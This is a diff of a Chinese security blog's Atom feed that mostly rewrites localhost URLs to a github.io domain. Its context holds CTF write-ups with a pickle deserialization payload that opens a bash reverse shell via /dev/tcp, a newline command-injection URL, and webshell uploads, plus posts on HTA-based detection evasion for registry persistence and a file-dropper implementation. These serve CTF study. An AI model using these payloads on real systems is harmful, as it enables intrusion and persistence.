@@ -1,45 +1,45 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-    <id>http://localhost:4000</id>
+    <id>https://daffodi11.github.io</id>
     <title>Daffodil</title>
-    <updated>2023-08-02T11:36:15.063Z</updated>
+    <updated>2023-08-02T11:42:50.693Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
-    <link rel="alternate" href="http://localhost:4000"/>
-    <link rel="self" href="http://localhost:4000/atom.xml"/>
+    <link rel="alternate" href="https://daffodi11.github.io"/>
+    <link rel="self" href="https://daffodi11.github.io/atom.xml"/>
     <subtitle>温故而知新</subtitle>
-    <logo>http://localhost:4000/images/avatar.png</logo>
-    <icon>http://localhost:4000/favicon.ico</icon>
+    <logo>https://daffodi11.github.io/images/avatar.png</logo>
+    <icon>https://daffodi11.github.io/favicon.ico</icon>
     <rights>All rights reserved 2023, Daffodil</rights>
     <entry>
         <title type="html"><![CDATA[Misc-被加密的生产流量-writeup]]></title>
-        <id>http://localhost:4000/post/misc-bei-jia-mi-de-sheng-chan-liu-liang-writeup/</id>
-        <link href="http://localhost:4000/post/misc-bei-jia-mi-de-sheng-chan-liu-liang-writeup/">
+        <id>https://daffodi11.github.io/post/misc-bei-jia-mi-de-sheng-chan-liu-liang-writeup/</id>
+        <link href="https://daffodi11.github.io/post/misc-bei-jia-mi-de-sheng-chan-liu-liang-writeup/">
         </link>
         <updated>2023-08-02T11:33:32.000Z</updated>
         <content type="html"><![CDATA[<p>Tcp0流 Base32解密<br>
-<img src="http://localhost:4000/post-images/1690976042533.png" alt="" loading="lazy"></p>
+<img src="https://daffodi11.github.io/post-images/1690976042533.png" alt="" loading="lazy"></p>
 ]]></content>
     </entry>
     <entry>
         <title type="html"><![CDATA[Misc-Sign_in_passwd-writeup]]></title>
-        <id>http://localhost:4000/post/misc-sign_in_passwd-writeup/</id>
-        <link href="http://localhost:4000/post/misc-sign_in_passwd-writeup/">
+        <id>https://daffodi11.github.io/post/misc-sign_in_passwd-writeup/</id>
+        <link href="https://daffodi11.github.io/post/misc-sign_in_passwd-writeup/">
         </link>
         <updated>2023-08-02T11:32:33.000Z</updated>
         <content type="html"><![CDATA[<p>urldecode+Base64<br>
-<img src="http://localhost:4000/post-images/1690976001665.png" alt="" loading="lazy"></p>
+<img src="https://daffodi11.github.io/post-images/1690976001665.png" alt="" loading="lazy"></p>
 ]]></content>
     </entry>
     <entry>
-        <title type="html"><![CDATA[Web-re-writeup]]></title>
-        <id>http://localhost:4000/post/web-re-writeup/</id>
-        <link href="http://localhost:4000/post/web-re-writeup/">
+        <title type="html"><![CDATA[Re-babyRE-writeup]]></title>
+        <id>https://daffodi11.github.io/post/web-re-writeup/</id>
+        <link href="https://daffodi11.github.io/post/web-re-writeup/">
         </link>
         <updated>2023-08-02T11:30:49.000Z</updated>
         <content type="html"><![CDATA[<!-- more -->
 <p>根据xml链接 导入可以发现是个游戏<br>
-<img src="http://localhost:4000/post-images/1690975921099.png" alt="" loading="lazy"><br>
-<img src="http://localhost:4000/post-images/1690975924994.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1690975921099.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1690975924994.png" alt="" loading="lazy"><br>
 导出这个列表  根据右边的算法解出来</p>
 <pre><code class="language-py">key = [102, 10, 13, 6, 28, 74, 3, 1, 3, 7, 85, 0, 4, 75, 20, 92, 92, 8, 28, 25,
       81, 83, 7, 28, 76, 88, 9, 0, 29, 73, 0, 86, 4, 87, 87, 82, 84, 85, 4, 85, 87, 30]
@@ -56,40 +56,40 @@ for i in key:
     </entry>
     <entry>
         <title type="html"><![CDATA[Web-Dumpit-writeup]]></title>
-        <id>http://localhost:4000/post/web-dumpit-writeup/</id>
-        <link href="http://localhost:4000/post/web-dumpit-writeup/">
+        <id>https://daffodi11.github.io/post/web-dumpit-writeup/</id>
+        <link href="https://daffodi11.github.io/post/web-dumpit-writeup/">
         </link>
         <updated>2023-08-02T11:29:52.000Z</updated>
         <content type="html"><![CDATA[<p>非预期<br>
 http://eci-2zefgz6c8k3wkvuo49ln.cloudeci1.ichunqiu.com:8888/?db=%0aenv%0a&amp;table_2_dump=flag1</p>
-<figure data-type="image" tabindex="1"><img src="http://localhost:4000/post-images/1690975821496.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://daffodi11.github.io/post-images/1690975821496.png" alt="" loading="lazy"></figure>
 ]]></content>
     </entry>
     <entry>
         <title type="html"><![CDATA[Web-unzip-writeup]]></title>
-        <id>http://localhost:4000/post/web-unzip-writeup/</id>
-        <link href="http://localhost:4000/post/web-unzip-writeup/">
+        <id>https://daffodi11.github.io/post/web-unzip-writeup/</id>
+        <link href="https://daffodi11.github.io/post/web-unzip-writeup/">
         </link>
         <updated>2023-08-02T11:26:16.000Z</updated>
         <content type="html"><![CDATA[<p>利用ln链接<br>
-<img src="http://localhost:4000/post-images/1690975758781.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1690975758781.png" alt="" loading="lazy"><br>
 上传1.zip 2.zip<br>
 连接webshell<br>
-<img src="http://localhost:4000/post-images/1690975764886.png" alt="" loading="lazy"></p>
+<img src="https://daffodi11.github.io/post-images/1690975764886.png" alt="" loading="lazy"></p>
 <p>获取flag<br>
-<img src="http://localhost:4000/post-images/1690975770546.png" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1690975770546.png" alt="" loading="lazy"><br>
 flag值：</p>
 ]]></content>
     </entry>
     <entry>
         <title type="html"><![CDATA[Web-crash-writeup]]></title>
-        <id>http://localhost:4000/post/web-crash-writeup/</id>
-        <link href="http://localhost:4000/post/web-crash-writeup/">
+        <id>https://daffodi11.github.io/post/web-crash-writeup/</id>
+        <link href="https://daffodi11.github.io/post/web-crash-writeup/">
         </link>
         <updated>2022-08-01T04:03:28.000Z</updated>
         <content type="html"><![CDATA[<p>打开题目看到源码 是python Flask<br>
-<img src="http://localhost:4000/post-images/1659326644548.jpg" alt="" loading="lazy"><br>
-<img src="http://localhost:4000/post-images/1659326648822.jpg" alt="" loading="lazy"></p>
+<img src="https://daffodi11.github.io/post-images/1659326644548.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659326648822.jpg" alt="" loading="lazy"></p>
 <pre><code class="language-python">
 import base64
 # import sqlite3
@@ -157,7 +157,7 @@ print(base64.b64encode(b'(cos\nsystem\nX\x33\x00\x00\x00bash -c &quot;bash -i &g
 print(hex(len('bash -c &quot;bash -i &gt;&amp; /dev/tcp/XX.XX.XX.XX/7788 0&gt;&amp;1&quot;')))
 </code></pre>
 <p>替换cookies弹shell<br>
-<img src="http://localhost:4000/post-images/1659326992331.jpg" alt="" loading="lazy"></p>
+<img src="https://daffodi11.github.io/post-images/1659326992331.jpg" alt="" loading="lazy"></p>
 <p>题目提示504页面 直接再起一个Flask</p>
 <pre><code class="language-python">from flask import Flask
 import random
@@ -173,36 +173,36 @@ if __name__ == '__main__':
 	app.run(host='0.0.0.0',port=5000)
 </code></pre>
 <p>没有vi vim 用cat 写入app.py<br>
-<img src="http://localhost:4000/post-images/1659327362470.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659327362470.jpg" alt="" loading="lazy"><br>
 启动 python3 app.py<br>
-<img src="http://localhost:4000/post-images/1659327367178.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659327367178.jpg" alt="" loading="lazy"><br>
 再次请求首页 拿到flag<br>
-<img src="http://localhost:4000/post-images/1659327604509.jpg" alt="" loading="lazy"></p>
+<img src="https://daffodi11.github.io/post-images/1659327604509.jpg" alt="" loading="lazy"></p>
 ]]></content>
     </entry>
     <entry>
         <title type="html"><![CDATA[Web-babyweb-writeup]]></title>
-        <id>http://localhost:4000/post/web-babyweb-writeup/</id>
-        <link href="http://localhost:4000/post/web-babyweb-writeup/">
+        <id>https://daffodi11.github.io/post/web-babyweb-writeup/</id>
+        <link href="https://daffodi11.github.io/post/web-babyweb-writeup/">
         </link>
         <updated>2022-08-01T01:44:26.000Z</updated>
-        <content type="html"><![CDATA[<p><img src="http://localhost:4000/post-images/1659318282681.jpg" alt="" loading="lazy"><br>
+        <content type="html"><![CDATA[<p><img src="https://daffodi11.github.io/post-images/1659318282681.jpg" alt="" loading="lazy"><br>
 打开网站首页 只有登录注册功能 注册一个账户 发现admin账户存在 爆破弱口令无果<br>
-<img src="http://localhost:4000/post-images/1659318365736.jpg" alt="" loading="lazy"><br>
-<img src="http://localhost:4000/post-images/1659318369825.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659318365736.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659318369825.jpg" alt="" loading="lazy"><br>
 随便注册一个账号 进去看功能 发现是个websocket bot<br>
-<img src="http://localhost:4000/post-images/1659318391607.jpg" alt="" loading="lazy"><br>
-<img src="http://localhost:4000/post-images/1659318430993.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659318391607.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659318430993.jpg" alt="" loading="lazy"><br>
 测试下bugreport 功能存在ssrf<br>
-<img src="http://localhost:4000/post-images/1659318503702.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659318503702.jpg" alt="" loading="lazy"><br>
 于是自己创建一个页面<br>
-<img src="http://localhost:4000/post-images/1659318625246.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659318625246.jpg" alt="" loading="lazy"><br>
 执行<br>
-<img src="http://localhost:4000/post-images/1659318697545.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659318697545.jpg" alt="" loading="lazy"><br>
 admin密码 成功修改 进入admin后台<br>
-<img src="http://localhost:4000/post-images/1659318765583.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659318765583.jpg" alt="" loading="lazy"><br>
 购买一个hint 根据提示下载源码<br>
-<img src="http://localhost:4000/post-images/1659318809004.jpg" alt="" loading="lazy"></p>
+<img src="https://daffodi11.github.io/post-images/1659318809004.jpg" alt="" loading="lazy"></p>
 <p>app.py</p>
 <pre><code class="language-python">@app.route(&quot;/buy&quot;, methods=['POST'])
 def buy():
@@ -324,44 +324,44 @@ func main() {
 &quot;key2&quot;:&quot;4&quot;<br>
 }<br>
 github.com/buger/jsonparser 解析时只会读取第一个值<br>
-<img src="http://localhost:4000/post-images/1659320478890.jpg" alt="" loading="lazy"></p>
+<img src="https://daffodi11.github.io/post-images/1659320478890.jpg" alt="" loading="lazy"></p>
 <p>所以<br>
-<img src="http://localhost:4000/post-images/1659320572398.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659320572398.jpg" alt="" loading="lazy"><br>
 搞定<br>
-<img src="http://localhost:4000/post-images/1659320579312.jpg" alt="" loading="lazy"></p>
+<img src="https://daffodi11.github.io/post-images/1659320579312.jpg" alt="" loading="lazy"></p>
 <p>2022 第六届 强网杯</p>
 ]]></content>
     </entry>
     <entry>
         <title type="html"><![CDATA[Web-rcefile-writeup]]></title>
-        <id>http://localhost:4000/post/web-rcefile-writeup/</id>
-        <link href="http://localhost:4000/post/web-rcefile-writeup/">
+        <id>https://daffodi11.github.io/post/web-rcefile-writeup/</id>
+        <link href="https://daffodi11.github.io/post/web-rcefile-writeup/">
         </link>
         <updated>2022-08-01T00:19:13.000Z</updated>
         <content type="html"><![CDATA[<p>打开网站发现是考察php文件上传漏洞<br>
-<img src="http://localhost:4000/post-images/1659313967356.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659313967356.jpg" alt="" loading="lazy"><br>
 直接FUZZ一下后缀 发现phar可以上传并且执行php代码<br>
-<img src="http://localhost:4000/post-images/1659314043764.jpg" alt="" loading="lazy"><br>
-<img src="http://localhost:4000/post-images/1659314048033.jpg" alt="" loading="lazy"><br>
-<img src="http://localhost:4000/post-images/1659314052282.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659314043764.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659314048033.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659314052282.jpg" alt="" loading="lazy"><br>
 蚁剑连接<br>
-<img src="http://localhost:4000/post-images/1659314100933.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659314100933.jpg" alt="" loading="lazy"><br>
 查看flag<br>
-<img src="http://localhost:4000/post-images/1659314110225.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1659314110225.jpg" alt="" loading="lazy"><br>
 2022年第六届强网杯</p>
 ]]></content>
     </entry>
     <entry>
         <title type="html"><![CDATA[利用HTML Application COM组件加载HTA 过检测修改注册表]]></title>
-        <id>http://localhost:4000/post/li-yong-html-application-com-zu-jian-jia-zai-hta-guo-jian-ce-xiu-gai-zhu-ce-biao/</id>
-        <link href="http://localhost:4000/post/li-yong-html-application-com-zu-jian-jia-zai-hta-guo-jian-ce-xiu-gai-zhu-ce-biao/">
+        <id>https://daffodi11.github.io/post/li-yong-html-application-com-zu-jian-jia-zai-hta-guo-jian-ce-xiu-gai-zhu-ce-biao/</id>
+        <link href="https://daffodi11.github.io/post/li-yong-html-application-com-zu-jian-jia-zai-hta-guo-jian-ce-xiu-gai-zhu-ce-biao/">
         </link>
         <updated>2022-02-17T03:09:01.000Z</updated>
         <content type="html"><![CDATA[<h2 id="起源">起源</h2>
 <p>想法来自一天分析恶意样本时，发现进程链是Excel-&gt;mshta-&gt;dllhost。</p>
 <h2 id="研究">研究</h2>
 <p>使用OLEVIEW查看有关com组件<br>
-<img src="http://localhost:4000/post-images/1645067653228.jpg" alt="" loading="lazy"><br>
+<img src="https://daffodi11.github.io/post-images/1645067653228.jpg" alt="" loading="lazy"><br>
 google发现 早有人对此进行了分析https://codewhitesec.blogspot.com/2018/07/lethalhta.html</p>
 <p>hta文件可以执行js与vbs脚本<br>
 js与vbs又可以调用wmi</p>
@@ -506,7 +506,7 @@ Close
 	pOut = NULL;
 </code></pre>
 <p>成功修改注册表启动项<br>
-<img src="http://localhost:4000/post-images/1645069118151.jpg" alt="" loading="lazy"></p>
+<img src="https://daffodi11.github.io/post-images/1645069118151.jpg" alt="" loading="lazy"></p>
 <p>当然也可以执行其他的wmi命令 例如创建进程、修改环境变量等等</p>
 <h4 id="tips-for-blue-team">Tips for blue team</h4>
 <p>监控mshta 与 dllhost</p>
@@ -517,8 +517,8 @@ Close
     </entry>
     <entry>
         <title type="html"><![CDATA[文件捆绑：两种释放文件的CPP实现]]></title>
-        <id>http://localhost:4000/post/liang-chong-shi-fang-wen-jian-de-cpp-shi-xian/</id>
-        <link href="http://localhost:4000/post/liang-chong-shi-fang-wen-jian-de-cpp-shi-xian/">
+        <id>https://daffodi11.github.io/post/liang-chong-shi-fang-wen-jian-de-cpp-shi-xian/</id>
+        <link href="https://daffodi11.github.io/post/liang-chong-shi-fang-wen-jian-de-cpp-shi-xian/">
         </link>
         <updated>2022-02-17T02:29:44.000Z</updated>
         <content type="html"><![CDATA[<h2 id="一-资源释放">一、资源释放</h2>
@@ -686,7 +686,7 @@ int main(int argc, char* argv[])
 	return 0;
 }
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="http://localhost:4000/post-images/1645065640562.jpg" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://daffodi11.github.io/post-images/1645065640562.jpg" alt="" loading="lazy"></figure>
 <h4 id="编译源码">编译源码</h4>
 <pre><code class="language-CPP">/*
  AnyFilesToByte By daffodil
@@ -804,7 +804,7 @@ return 0;
 }
 </code></pre>
 <h4 id="编译运行释放文件">编译运行释放文件</h4>
-<figure data-type="image" tabindex="2"><img src="http://localhost:4000/post-images/1645065936639.jpg" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://daffodi11.github.io/post-images/1645065936639.jpg" alt="" loading="lazy"></figure>
 ]]></content>
     </entry>
 </feed>
